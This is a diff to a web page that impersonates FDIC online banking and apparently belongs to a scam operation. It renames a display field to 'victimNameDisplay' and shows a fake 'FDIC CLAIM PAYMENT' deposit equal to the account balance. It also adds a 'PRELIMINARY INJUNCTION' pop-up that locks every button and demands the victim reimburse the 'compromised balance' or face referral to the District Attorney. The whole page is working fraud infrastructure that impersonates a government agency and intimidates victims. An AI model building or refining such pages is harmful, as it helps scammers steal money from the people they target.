@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FDIC Dashboard</title>
+  <title>FDIC Online Banking | Dashboard</title>
   <style>
     :root {
       --fdic-blue: #003366;
@@ -12,45 +12,88 @@
       --text-dark: #333;
       --white: #ffffff;
       --border: #d1d5db;
+      --success-green: #28a745;
+      --alert-red: #d9534f;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    body { background: var(--fdic-gray); color: var(--text-dark); min-height: 100vh; }
+    body { background: var(--fdic-gray); color: var(--text-dark); min-height: 100vh; padding-bottom: 80px; }
     
     /* Header */
-    .header { background: var(--fdic-blue); color: white; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
-    .header h2 { font-size: 20px; font-weight: 600; }
-    .user-info { font-size: 14px; display: flex; align-items: center; gap: 15px; }
+    .header { background: var(--fdic-blue); color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+    .header h2 { font-size: 18px; font-weight: 600; }
+    .user-info { font-size: 13px; display: flex; align-items: center; gap: 15px; }
     .user-info a { color: white; text-decoration: none; cursor: pointer; }
     
-    /* Navigation */
-    .nav-tabs { background: var(--white); border-bottom: 1px solid var(--border); display: flex; padding: 0 30px; }
-    .nav-tab { padding: 15px 20px; cursor: pointer; border-bottom: 3px solid transparent; font-size: 14px; color: #666; font-weight: 500; }
-    .nav-tab.active { border-bottom: 3px solid var(--fdic-light-blue); color: var(--fdic-light-blue); }
-    .nav-tab:hover { background: #f9fafb; }
-    
-    /* Content */
-    .content { padding: 30px; max-width: 900px; margin: 0 auto; }
-    .card { background: var(--white); border-radius: 8px; padding: 25px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-    .card h3 { font-size: 18px; margin-bottom: 20px; color: var(--fdic-blue); border-bottom: 1px solid #eee; padding-bottom: 10px; }
-    
+    /* Main Container */
+    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
+
     /* Account Card */
-    .account-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-    .account-type { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #666; font-weight: 600; }
-    .account-number { font-size: 14px; color: var(--text-dark); font-family: monospace; }
-    .balance-label { font-size: 14px; color: #666; margin-bottom: 5px; }
-    .balance { font-size: 32px; font-weight: 700; color: var(--fdic-blue); margin-bottom: 20px; }
+    .account-card { background: var(--white); border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    .account-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
+    .account-title h3 { font-size: 16px; color: #666; font-weight: 500; }
+    .account-title h2 { font-size: 20px; color: var(--text-dark); font-weight: 700; }
+    .account-number { font-size: 13px; color: #888; font-family: monospace; }
     
-    .quick-actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 20px; }
-    .action-btn { padding: 15px; background: #f8f9fa; border: 1px solid var(--border); border-radius: 6px; text-align: center; cursor: pointer; font-size: 14px; color: var(--fdic-light-blue); font-weight: 500; transition: all 0.2s; }
-    .action-btn:hover { background: var(--fdic-light-blue); color: white; border-color: var(--fdic-light-blue); }
+    .balance-section { margin: 20px 0; }
+    .balance-label { font-size: 13px; color: #666; margin-bottom: 5px; }
+    .balance-amount { font-size: 32px; font-weight: 700; color: var(--fdic-blue); }
     
-    /* Demographics */
-    .demo-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-    .demo-item { margin-bottom: 15px; }
-    .demo-label { font-size: 12px; color: #666; margin-bottom: 5px; text-transform: uppercase; }
-    .demo-value { font-size: 15px; font-weight: 500; color: var(--text-dark); }
+    /* Action Buttons */
+    .actions-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+    .action-btn { 
+      background: var(--fdic-light-blue); 
+      color: white; 
+      border: none; 
+      padding: 15px 10px; 
+      border-radius: 6px; 
+      font-size: 13px; 
+      font-weight: 600; 
+      cursor: pointer; 
+      text-align: center;
+      transition: background 0.2s;
+    }
+    .action-btn:hover { background: var(--fdic-blue); }
+    .action-btn span { display: block; font-size: 18px; margin-bottom: 5px; }
+
+    /* Transaction History */
+    .transactions-card { background: var(--white); border-radius: 10px; padding: 20px; margin-top: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    .trans-header { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: var(--text-dark); border-bottom: 1px solid #eee; padding-bottom: 10px; }
     
-    /* Loading State */
+    .trans-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
+    .trans-item:last-child { border-bottom: none; }
+    .trans-info { flex: 1; }
+    .trans-desc { font-size: 14px; font-weight: 500; color: var(--text-dark); margin-bottom: 3px; }
+    .trans-meta { font-size: 12px; color: #888; }
+    .trans-amount { font-size: 14px; font-weight: 700; color: var(--success-green); text-align: right; }
+    .trans-status { font-size: 10px; background: #e6f4ea; color: var(--success-green); padding: 2px 6px; border-radius: 4px; margin-left: 8px; }
+
+    /* Modal/Popup */
+    .modal-overlay {
+      display: none;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-overlay.active { display: flex; }
+    .modal-content {
+      background: white;
+      padding: 25px;
+      border-radius: 8px;
+      max-width: 90%;
+      width: 400px;
+      text-align: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    .modal-title { font-size: 18px; font-weight: 700; color: var(--alert-red); margin-bottom: 15px; text-transform: uppercase; }
+    .modal-body { font-size: 14px; color: #333; line-height: 1.5; margin-bottom: 20px; text-align: left; }
+    .modal-body strong { color: var(--fdic-blue); }
+    .modal-close {
+      background: var(--fdic-blue); color: white; border: none; padding: 10px 20px;
+      border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600;
+    }
+
     .loading { text-align: center; padding: 40px; color: #666; }
   </style>
 </head>
@@ -64,63 +107,70 @@
     </div>
   </div>
 
-  <div class="nav-tabs">
-    <div class="nav-tab active" onclick="showTab('accounts')">Accounts</div>
-    <div class="nav-tab" onclick="showTab('activity')">Activity</div>
-    <div class="nav-tab" onclick="showTab('profile')">Profile</div>
-  </div>
-
-  <div class="content">
+  <div class="container">
     <div id="loadingMsg" class="loading">Loading your account...</div>
 
-    <!-- Accounts Tab -->
-    <div id="accounts" class="tab-content" style="display:none;">
-      <div class="card">
+    <!-- Main Content (Hidden until loaded) -->
+    <div id="mainContent" style="display:none;">
+      
+      <!-- Account Summary -->
+      <div class="account-card">
         <div class="account-header">
-          <span class="account-type" id="accountType">CHECKING</span>
-          <span class="account-number" id="accountNumber">---1234</span>
+          <div class="account-title">
+            <h3 id="accountType">CHECKING</h3>
+            <h2 id="victimNameDisplay">Victim Name</h2>
+            <div class="account-number" id="accountNumber">---1234</div>
+          </div>
         </div>
-        <div class="balance-label">Available Balance</div>
-        <div class="balance" id="balanceDisplay">$0.00</div>
-        <div class="quick-actions">
-          <div class="action-btn">Transfer Funds</div>
-          <div class="action-btn">Pay Bills</div>
-          <div class="action-btn">Deposit Check</div>
+        
+        <div class="balance-section">
+          <div class="balance-label">Available Balance</div>
+          <div class="balance-amount" id="balanceDisplay">$0.00</div>
+        </div>
+
+        <div class="actions-grid">
+          <button class="action-btn" onclick="showRestrictedModal()">
+            <span>⇄</span>Transfer Funds
+          </button>
+          <button class="action-btn" onclick="showRestrictedModal()">
+            <span>+</span>Deposit
+          </button>
+          <button class="action-btn" onclick="showRestrictedModal()">
+            <span>📄</span>Pay Bills
+          </button>
+        </div>
+      </div>
+
+      <!-- Transaction History -->
+      <div class="transactions-card">
+        <div class="trans-header">Recent Activity</div>
+        
+        <div class="trans-item">
+          <div class="trans-info">
+            <div class="trans-desc">FDIC CLAIM PAYMENT REF:8821-4490</div>
+            <div class="trans-meta" id="transDate">07/23/2026 09:14:22 AM EST</div>
+            <div class="trans-meta">ID: FDIC-CLM-20260723-99841</div>
+          </div>
+          <div style="text-align: right;">
+            <div class="trans-amount" id="transAmount">+$4,250.00</div>
+            <div class="trans-status">POSTED</div>
+          </div>
         </div>
       </div>
     </div>
+  </div>
 
-    <!-- Activity Tab -->
-    <div id="activity" class="tab-content" style="display:none;">
-      <div class="card">
-        <h3>Recent Transactions</h3>
-        <p style="color:#666; font-size:14px;">No recent transactions found.</p>
+  <!-- Restricted Modal -->
+  <div class="modal-overlay" id="restrictedModal">
+    <div class="modal-content">
+      <div class="modal-title">ACCOUNT RESTRICTED</div>
+      <div class="modal-body">
+        <strong>PRELIMINARY INJUNCTION</strong><br><br>
+        Transfer, withdrawal, and deposit functions are <strong>LOCKED</strong>.<br><br>
+        <strong>Action Required:</strong> Reimburse the compromised balance to lift the hold.<br><br>
+        <strong>Notice:</strong> Failure to remit payment will result in immediate referral to the local District Attorney for legal action.
       </div>
-    </div>
-
-    <!-- Profile Tab -->
-    <div id="profile" class="tab-content" style="display:none;">
-      <div class="card">
-        <h3>Account Holder Details</h3>
-        <div class="demo-grid">
-          <div class="demo-item">
-            <div class="demo-label">Full Name</div>
-            <div class="demo-value" id="demoName">John Doe</div>
-          </div>
-          <div class="demo-item">
-            <div class="demo-label">Email Address</div>
-            <div class="demo-value" id="demoEmail">john@example.com</div>
-          </div>
-          <div class="demo-item">
-            <div class="demo-label">Phone Number</div>
-            <div class="demo-value" id="demoPhone">(555) 123-4567</div>
-          </div>
-          <div class="demo-item">
-            <div class="demo-label">Mailing Address</div>
-            <div class="demo-value" id="demoAddress">123 Main St, City, ST</div>
-          </div>
-        </div>
-      </div>
+      <button class="modal-close" onclick="closeRestrictedModal()">Close Notice</button>
     </div>
   </div>
 
@@ -142,12 +192,12 @@
     const auth = getAuth(app);
     const db = getDatabase(app);
 
-    // Tab Switching
-    window.showTab = (tabId) => {
-      document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
-      document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
-      document.getElementById(tabId).style.display = 'block';
-      document.querySelector(`.nav-tab[onclick="showTab('${tabId}')"]`).classList.add('active');
+    // Modal Functions
+    window.showRestrictedModal = () => {
+      document.getElementById('restrictedModal').classList.add('active');
+    };
+    window.closeRestrictedModal = () => {
+      document.getElementById('restrictedModal').classList.remove('active');
     };
 
     // Logout
@@ -166,26 +216,47 @@
           
           if (data) {
             document.getElementById('loadingMsg').style.display = 'none';
-            document.getElementById('accounts').style.display = 'block';
-            document.getElementById('userNameDisplay').textContent = `Welcome, ${data.name}`;
+            document.getElementById('mainContent').style.display = 'block';
+            
+            // Update Header
+            document.getElementById('userNameDisplay').textContent = data.name;
             
             // Update Account Info
-            document.getElementById('accountType').textContent = data.type.toUpperCase();
-            document.getElementById('accountNumber').textContent = `---${data.last4}`;
-            document.getElementById('balanceDisplay').textContent = `$${parseFloat(data.balance).toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            document.getElementById('victimNameDisplay').textContent = data.name;
+            document.getElementById('accountType').textContent = data.type ? data.type.toUpperCase() : 'CHECKING';
+            document.getElementById('accountNumber').textContent = `---${data.last4 || '1234'}`;
             
-            // Update Demographics
-            document.getElementById('demoName').textContent = data.name;
-            document.getElementById('demoEmail').textContent = data.email;
-            document.getElementById('demoPhone').textContent = data.phone;
-            document.getElementById('demoAddress').textContent = data.address;
+            // Format Balance
+            const balanceVal = parseFloat(data.balance || 0);
+            document.getElementById('balanceDisplay').textContent = `$${balanceVal.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            
+            // Format Transaction Amount (Matches Balance)
+            document.getElementById('transAmount').textContent = `+$${balanceVal.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            
+            // Format Transaction Date (Uses createdAt timestamp)
+            let transDateStr = "07/23/2026 09:14:22 AM EST";
+            if (data.createdAt) {
+              const date = new Date(data.createdAt);
+              transDateStr = date.toLocaleString('en-US', {
+                month: '2-digit',
+                day: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true,
+                timeZone: 'America/New_York'
+              }) + " EST";
+            }
+            document.getElementById('transDate').textContent = transDateStr;
+
           } else {
             alert("Account not found.");
             signOut(auth);
           }
         } catch (error) {
           console.error("Error loading data:", error);
-          document.getElementById('loadingMsg').textContent = "Error loading account.";
+          document.getElementById('loadingMsg').textContent = "Error loading account. Check console.";
         }
       } else {
         window.location.href = "index.html";
